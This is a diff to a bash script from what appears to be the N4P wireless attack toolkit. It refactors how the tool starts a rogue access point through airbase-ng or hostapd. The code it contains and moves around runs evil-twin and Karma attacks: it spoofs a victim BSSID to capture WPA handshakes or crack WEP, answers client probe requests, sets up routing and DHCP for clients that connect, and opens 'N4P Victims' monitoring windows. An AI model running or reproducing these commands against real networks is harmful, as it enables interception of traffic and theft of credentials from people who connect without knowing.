@@ -61,10 +61,10 @@ depends()
     get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
     get_name "SECURITY_TYPE="; SECURITY_TYPE=$USE
     get_name "ENCRYPTION="; ENCRYPTION=$USE
-    get_name "MONITOR="; MONITOR=$USE
+    get_name "MONITOR_MODE="; MONITOR_MODE=$USE
     get_name "VERBOSE_LOGS="; VERBOSE_LOGS=$USE
     get_name "HOSTAPD_CONFIG="; HOSTAPD_CONFIG=$USE
-    AP="at0" #This is the device name as per "ip addr"
+    [[ $UAP == "HOSTAPD" ]] && AP="$IFACE1" || AP="at0" #This is the device name as per "ip addr"
     MON="${IFACE1}mon"
     IFACEBUG="0"
     AP_GATEWAY=$(grep routers ${DIR_CONF}dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
@@ -110,6 +110,7 @@ killemAll()
     pkill airbase-ng
     [[ $UAP == "AIRBASE" ]] && airmon-ng stop $MON
 
+    kill -9 $(ps -A | grep dhcpd | awk -F' ' '{print $1}')
     echo "${INFO} The environment is now sanitized cya${TXT_RST}"
     exit 0
 }
@@ -185,23 +186,8 @@ do_it_check() #move this into a module next version and add checks for kali peop
     [[ $UAP == "AIRBASE" ]] && startairbase
 }
 
-startairbase() #There is still something seriously wonky now since 1.1 with airbase as AP regarding assigning DHCP fix this HIGH PRIORITY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+setroutes()
 {
-    echo -n "{$INFO} STARTING SERVICE: AIRBASE-NG${TXT_RST}"
-    if [[ $VERBOSE_LOGS == "True" ]]; then
-        echo "$(date)" >> ${SESSIONFOLDER}logs/airbase-ng.log
-        xterm -hold -bg black -fg green -T "Airbase-NG Log Window" -geometry 90x20 -e tail -f ${SESSIONFOLDER}logs/airbase-ng.log &>/dev/null &
-    fi
-
-    if [[ $ATTACK == "Handshake" || $ATTACK == "WEP" ]]; then
-        airbase-ng -c ${CHAN} -a ${VICTIM_BSSID} -e ${ESSID} -${SECURITY_TYPE} ${ENCRYPTION} -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
-    elif [[ $ATTACK == "Karma" ]]; then
-        airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -C 15 -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
-    else # This just gives us an AP for Sniffing
-        airbase-ng -c $CHAN -a $LOCAL_BSSID -e $ESSID -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
-    fi
-    sleep 2
-
     get_state "$AP"
     while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
         sleep 0.5
@@ -224,32 +210,51 @@ startairbase() #There is still something seriously wonky now since 1.1 with airb
         done
 
         while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
-            sleep 0.3       
+            sleep 0.3
             ip route add ${AP_IP}/24 via $AP_GATEWAY
             #route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY #Out with the old in with the new
         done
+    fi
         route -n
         ${DIR}/./dhcp
+}
+startairbase() #There is still something seriously wonky now since 1.1 with airbase as AP regarding assigning DHCP fix this HIGH PRIORITY!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+{
+    echo -n "{$INFO} STARTING SERVICE: AIRBASE-NG${TXT_RST}"
+    if [[ $VERBOSE_LOGS == "True" ]]; then
+        echo "$(date)" >> ${SESSIONFOLDER}logs/airbase-ng.log
+        xterm -hold -bg black -fg green -T "Airbase-NG Log Window" -geometry 90x20 -e tail -f ${SESSIONFOLDER}logs/airbase-ng.log &>/dev/null &
     fi
+
+    if [[ $ATTACK == "Handshake" || $ATTACK == "WEP" ]]; then
+        airbase-ng -c ${CHAN} -a ${VICTIM_BSSID} -e ${ESSID} -${SECURITY_TYPE} ${ENCRYPTION} -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
+    elif [[ $ATTACK == "Karma" ]]; then
+        airbase-ng -c $CHAN -x $PPS -I $BEACON -a $LOCAL_BSSID -e $ESSID -P -C 15 -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
+    else # This just gives us an AP for Sniffing
+        airbase-ng -c $CHAN -a $LOCAL_BSSID -e $ESSID -v $MON >> ${SESSIONFOLDER}logs/airbase-ng.log &
+    fi
+    sleep 2
+    setroutes
     monitor $AP
 }
 
 monitor()
 {
-    if [[ -n $MONITOR ]]; then
-        if [[ $MONITOR == "Custom" ]]; then
-            xterm -hold -geometry 60x35 -bg black -fg blue -T "N4P Victims" -e ${DIR}./monitor $1 &>/dev/null &
-        elif [[ $MONITOR == "dhcpdump" ]]; then
-            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e dhcpdump -i $1 &>/dev/null &
-        elif [[ $MONITOR == "arp" ]]; then
-            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e arp -a -i $1 &>/dev/null &
+    if [[ -n $MONITOR_MODE ]]; then
+        if [[ $MONITOR_MODE == "Custom" ]]; then
+            xterm -bg black -fg DodgerBlue1 -T "N4P Victims" -geometry 65x15 -e "bash -ic \"${DIR}/./monitor ; bash\"" &>/dev/null &
+        elif [[ $MONITOR_MODE == "dhcpdump" ]]; then
+            xterm -bg black -fg DodgerBlue1 -T "N4P Victims" -geometry 65x15 -e "bash -ic \"dhcpdump ; bash\"" &>/dev/null &
+        elif [[ $MONITOR_MODE == "arp" ]]; then
+            xterm -bg black -fg DodgerBlue1 -T "N4P Victims" -geometry 65x15 -e "bash -ic \"arp -a -i $1 ; bash\"" &>/dev/null &
         fi
     fi
 }
 
 starthostapd()
 {
-  hostapd $HOSTAPD_CONFIG
+  hostapd $HOSTAPD_CONFIG &>/dev/null &
+  setroutes
   monitor $AP
 }
 
